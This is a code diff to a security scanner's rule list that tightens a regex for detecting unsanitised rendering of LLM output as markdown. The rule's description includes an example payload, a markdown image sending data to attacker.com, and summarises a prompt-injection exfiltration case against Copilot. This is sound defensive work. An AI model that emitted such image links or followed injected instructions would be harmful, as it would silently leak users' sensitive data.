@@ -242,7 +242,7 @@ export const aiSecurityRules: SecurityRule[] = [
     owasp: "A02:2025 Injection",
     description:
       "LLM output containing markdown images is rendered without URL validation. Attackers can trick the model into outputting ![img](https://attacker.com/exfil?data=SENSITIVE_DATA) — the browser automatically fetches the URL, silently exfiltrating data. This was exploited against Microsoft 365 Copilot in 2025.",
-    pattern: /(?:dangerouslySetInnerHTML|innerHTML|v-html|marked|remark|rehype|unified|react-markdown)[\s\S]{0,300}?(?:message\.content|completion|output|response|aiResponse|result\.text)/gi,
+    pattern: /(?:dangerouslySetInnerHTML|innerHTML|v-html|<ReactMarkdown\b)[\s\S]{0,300}?(?:message\.content|completion|aiResponse|chatResponse|llmResponse|result\.text|generated_text|gpt[A-Z_]\w*|claude[A-Z_]\w*|openai\.\w+\.create)/g,
     languages: ["javascript", "typescript"],
     fix: "Sanitize LLM output before rendering as markdown. Strip or validate image URLs against an allowlist.",
     fixCode:
